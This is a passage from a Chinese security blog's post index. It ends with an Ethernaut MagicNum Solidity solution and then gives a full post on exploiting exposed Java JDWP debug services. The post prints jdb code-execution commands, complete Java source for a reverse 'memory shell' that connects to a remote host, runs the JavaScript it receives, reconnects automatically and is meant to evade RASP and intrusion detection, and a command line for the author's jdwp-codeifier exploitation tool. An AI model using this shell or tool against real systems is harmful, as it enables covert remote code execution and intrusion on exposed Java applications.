</span><br><span class="line">           ___________\/\\\_____/\\\\\\\\\\\\\\\_ </span><br><span class="line">            ___________\///_____\///////////////__</span><br><span class="line">  */</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Solution-17"><a href="#Solution-17" class="headerlink" title="Solution"></a>Solution</h3><p>题意是构造如下的一个合约</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line"></span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract MagicNumBadSolver &#123;</span><br><span class="line">    </span><br><span class="line">  function whatIsTheMeaningOfLife() public pure returns (bytes32) &#123;</span><br><span class="line">    return bytes4(int32(42));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line"></span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract MagicNumSolver &#123;</span><br><span class="line">  constructor() public &#123;</span><br><span class="line">    assembly &#123;</span><br><span class="line"></span><br><span class="line">      // This is the bytecode we want the program to have:</span><br><span class="line">      // 00 PUSH1 2a /* push dec 42 (hex 0x2a) onto the stack */</span><br><span class="line">      // 03 PUSH1  0 /* store 42 at memory position 0 */</span><br><span class="line">      // 05 MSTORE</span><br><span class="line">      // 06 PUSH1 20 /* return 32 bytes in memory */</span><br><span class="line">      // 08 PUSH1 0</span><br><span class="line">      // 10 RETURN</span><br><span class="line">      // Bytecode: 0x604260005260206000f3 (length 0x0a or 10)</span><br><span class="line">      // Bytecode within a 32 byte word:</span><br><span class="line">      // 0x00000000000000000000000000000000000000000000604260005260206000f3 (length 0x20 or 32)</span><br><span class="line">      //                                               ^ (offset 0x16 or 22)</span><br><span class="line">      </span><br><span class="line">      mstore(0, 0x602a60005260206000f3)</span><br><span class="line">      return(0x16, 0x0a)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://hitcxy.com/2019/ethernaut/">Ethernaut – Smart Contract</a></p>
<p><a href="https://www.cnblogs.com/hac425/p/9771230.html">ethernaut 以太坊靶场学习 （1-12）</a></p>
<p><a href="http://rickgray.me/2018/05/17/ethereum-smart-contracts-vulnerabilites-review/">以太坊智能合约安全入门了解一下（上）</a></p>
<p><a href="http://rickgray.me/2018/05/26/ethereum-smart-contracts-vulnerabilities-review-part2">以太坊智能合约安全入门了解一下（下）</a></p>
]]></content>
      <tags>
        <tag>智能合约</tag>
        <tag>区块链</tag>
        <tag>Solidity</tag>
      </tags>
  </entry>
  <entry>
    <title>通过JDWP漏洞注入&quot;不一样&quot;的内存马</title>
    <url>/2023/12/03/%E9%80%9A%E8%BF%87JDWP%E6%BC%8F%E6%B4%9E%E6%B3%A8%E5%85%A5%E4%B8%8D%E4%B8%80%E6%A0%B7%E7%9A%84%E5%86%85%E5%AD%98%E9%A9%AC/</url>
    <content><![CDATA[<p>JDWP全称Java Debug Wire Protocol，JDWP漏洞指对外开放了Java调试服务，从而可以实现远程代码执行。目前JDWP的武器化脚本一般只能命令执行，但直接执行命令可能被RASP拦截告警，或者被入侵检测发现，而且在实际渗透测试过程中，也不一定需要执行命令，更需要的可能是一个入口，这种情况下通常是注入内存马或者内存代理。本文基于这个需求实现了可以动态执行代码并注入内存马的JDWP漏洞利用工具。</p>
<span id="more"></span>

<h2 id="JDWP漏洞利用"><a href="#JDWP漏洞利用" class="headerlink" title="JDWP漏洞利用"></a>JDWP漏洞利用</h2><p>除了通过现有的脚本执行系统命令以外，其实也可以通过Java自带工具jdb执行任意Java代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">jdb -connect com.sun.jdi.SocketAttach:hostname=127.0.0.1,port=8000</span><br><span class="line">threads   #查找休眠线程</span><br><span class="line">thread 0x25c   #选择休眠线程</span><br><span class="line">stepi</span><br><span class="line">eval java.lang.System.getProperty(&quot;os.name&quot;)</span><br></pre></td></tr></table></figure>

<p><img src="/2023/12/03/%E9%80%9A%E8%BF%87JDWP%E6%BC%8F%E6%B4%9E%E6%B3%A8%E5%85%A5%E4%B8%8D%E4%B8%80%E6%A0%B7%E7%9A%84%E5%86%85%E5%AD%98%E9%A9%AC/image-20231203201646530.png" alt="image-20231203201646530"></p>
<p>但有的类并不能直接使用，会出现找不到该类的情况，例如：</p>
<p><img src="/2023/12/03/%E9%80%9A%E8%BF%87JDWP%E6%BC%8F%E6%B4%9E%E6%B3%A8%E5%85%A5%E4%B8%8D%E4%B8%80%E6%A0%B7%E7%9A%84%E5%86%85%E5%AD%98%E9%A9%AC/image-20231203204313228.png" alt="image-20231203204313228"></p>
<p>当然也可以通过反射去加载，或者可能还有其他加载方式，不过我也没仔细研究这块，毕竟通过jdb执行代码还是很麻烦</p>
<h2 id="反向内存Shell"><a href="#反向内存Shell" class="headerlink" title="反向内存Shell"></a>反向内存Shell</h2><p>所谓内存马，应该一般都指内存WebShell，这块已经有非常多的研究文章了。但如果放到JDWP漏洞中来看，可能并不一定适用，因为存在漏洞的应用本身或许不是一个Web应用。而这种情况下无论是通过常规意义上的反弹shell还是下载二进制木马进行进一步利用，都是一个敏感且高危的操作，可能被RASP拦截或者被入侵检测发现。</p>
<p>既然可以执行Java代码，那么其实可以在Java进程中启动一个线程，通过自定义的逻辑，去反弹出一个执行Java代码的”Shell”，具体实现如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.script.ScriptEngine;</span><br><span class="line"><span class="keyword">import</span> javax.script.ScriptEngineManager;</span><br><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"><span class="keyword">import</span> java.net.InetAddress;</span><br><span class="line"><span class="keyword">import</span> java.net.Socket;</span><br><span class="line"><span class="keyword">import</span> java.time.Duration;</span><br><span class="line"><span class="keyword">import</span> java.time.LocalDateTime;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">App</span> <span class="keyword">extends</span> <span class="title class_">Thread</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> ScriptEngine scriptEngine;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String host;</span><br><span class="line">    <span class="keyword">private</span> Integer port;</span><br><span class="line">    <span class="keyword">private</span> Double life;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String <span class="title function_">execCode</span><span class="params">(String code)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (code.trim().equals(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> scriptEngine.eval(code);</span><br><span class="line">            <span class="keyword">if</span> (result != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> result + <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">return</span> e + <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String <span class="title function_">getInfo</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">info</span> <span class="operator">=</span> <span class="string">&quot;  os: &quot;</span> + System.getProperty(<span class="string">&quot;os.name&quot;</span>) + <span class="string">&quot; &quot;</span> + System.getProperty(<span class="string">&quot;os.arch&quot;</span>) + <span class="string">&quot; &quot;</span> + System.getProperty(<span class="string">&quot;os.version&quot;</span>);</span><br><span class="line">        info += <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        info += <span class="string">&quot;user: &quot;</span> + System.getProperty(<span class="string">&quot;user.name&quot;</span>);</span><br><span class="line">        info += <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            info += <span class="string">&quot;host: &quot;</span> + InetAddress.getLocalHost().getHostName();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            info += <span class="string">&quot;host: &quot;</span> + e;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> info;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">exit</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="type">LocalDateTime</span> <span class="variable">time</span> <span class="operator">=</span> LocalDateTime.now();</span><br><span class="line">        <span class="keyword">while</span> (Duration.between(time, LocalDateTime.now()).toMillis() / (<span class="number">60.0</span> * <span class="number">1000.0</span>) &lt; life &amp;&amp; !exit) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">Socket</span> <span class="variable">socket</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Socket</span>(host, port);</span><br><span class="line">                <span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PrintWriter</span>(socket.getOutputStream());</span><br><span class="line">                <span class="type">BufferedReader</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(socket.getInputStream()));</span><br><span class="line"></span><br><span class="line">                scriptEngine = <span class="keyword">new</span> <span class="title class_">ScriptEngineManager</span>().getEngineByName(<span class="string">&quot;js&quot;</span>);</span><br><span class="line"></span><br><span class="line">                out.print(getInfo() + <span class="string">&quot;\n\n&gt;&gt;&gt; &quot;</span>);</span><br><span class="line">                out.flush();</span><br><span class="line">                String input;</span><br><span class="line">                <span class="keyword">while</span> ((input = in.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">                    time = LocalDateTime.now();</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (input.trim().equals(<span class="string">&quot;exit&quot;</span>) || input.trim().equals(<span class="string">&quot;exit()&quot;</span>)) &#123;</span><br><span class="line">                        exit = <span class="literal">true</span>;</span><br><span class="line">                        socket.close();</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    out.print(execCode(input) + <span class="string">&quot;&gt;&gt;&gt; &quot;</span>);</span><br><span class="line">                    out.flush();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                ;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (!exit) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    Thread.sleep(<span class="number">5</span> * <span class="number">1000</span>);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                    ;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">App</span><span class="params">(String host, Integer port, Double life)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.host = host;</span><br><span class="line">        <span class="built_in">this</span>.port = port;</span><br><span class="line">        <span class="built_in">this</span>.life = life;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">exploit</span><span class="params">(String host, Integer port, Double life)</span> &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">App</span>(host,  port,  life).start();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        exploit(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">8080</span>, <span class="number">0.3</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>服务端通过nc监听即可：</p>
<p><img src="/2023/12/03/%E9%80%9A%E8%BF%87JDWP%E6%BC%8F%E6%B4%9E%E6%B3%A8%E5%85%A5%E4%B8%8D%E4%B8%80%E6%A0%B7%E7%9A%84%E5%86%85%E5%AD%98%E9%A9%AC/image-20231204234432620.png" alt="image-20231204234432620"></p>
<p>这样就得到了一个交互式的不易被拦截的代码执行Shell，对比正向的内存WebShell，用”反向Java内存Shell”去形容似乎更准确些。按照这个思路，其实还可以写一个”反向Java内存代理”，类似于frp的socks5反向代理功能</p>
<h2 id="jdwp-codeifier"><a href="#jdwp-codeifier" class="headerlink" title="jdwp-codeifier"></a>jdwp-codeifier</h2><p>对于JDWP漏洞的武器化利用最早可以追溯到2014年的项目：<a href="https://github.com/IOActive/jdwp-shellifier">https://github.com/IOActive/jdwp-shellifier</a> ，作者通过Python2实现JDWP协议，以设置断点的方式获取线程上下文从而调用Runtime.getRuntime().exec()执行系统命令</p>
<p>2020年Lz1y借鉴<a href="https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/multi/misc/java_jdwp_debugger.rb">MSF中的利用方式</a>改写jdwp-shellifier，通过对Sleeping的线程发送单步执行事件，完成断点，从而可以直接获取上下文、执行命令，而不用等待断点被击中，项目地址：<a href="https://github.com/Lz1y/jdwp-shellifier">https://github.com/Lz1y/jdwp-shellifier</a></p>
<p>2022年r3change基于原版断点方式的jdwp-shellifier进行改写，增加了命令执行的回显，项目地址：<a href="https://github.com/r3change/jdwp-shellifier">https://github.com/r3change/jdwp-shellifier</a></p>
<p>但以上都无法满足前文中的代码执行需求，所以我基于jdwp-shellifier再次改写了一版进阶的JDWP漏洞利用脚本，改名为<a href="https://github.com/l3yx/jdwp-codeifier">jdwp-codeifier</a>，同样使用不需要等待断点的方式且能够动态执行Java&#x2F;Js代码并获得回显。同时也将上文中的内存Shell内置进了工具中，反弹Java内存Shell：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python jdwp-codeifier.py -t 192.168.65.254 -p 8000 -m rshell -a 127.0.0.1:8080 -l 0.1</span><br><span class="line"># -a 指定接收shell的地址</span><br><span class="line"># -l 指定shell与服务器连接不上时的最大存活时间（分钟）（每隔5秒自动重连）</span><br></pre></td></tr></table></figure>

<p><img src="/2023/12/03/%E9%80%9A%E8%BF%87JDWP%E6%BC%8F%E6%B4%9E%E6%B3%A8%E5%85%A5%E4%B8%8D%E4%B8%80%E6%A0%B7%E7%9A%84%E5%86%85%E5%AD%98%E9%A9%AC/image-20231204234649972.png" alt="image-20231204234649972"></p>
<p>最后，项目地址：<a href="https://github.com/l3yx/jdwp-codeifier">https://github.com/l3yx/jdwp-codeifier</a></p>
]]></content>
      <tags>
        <tag>JDWP</tag>
        <tag>内存马</tag>
      </tags>
  </entry>
</search>
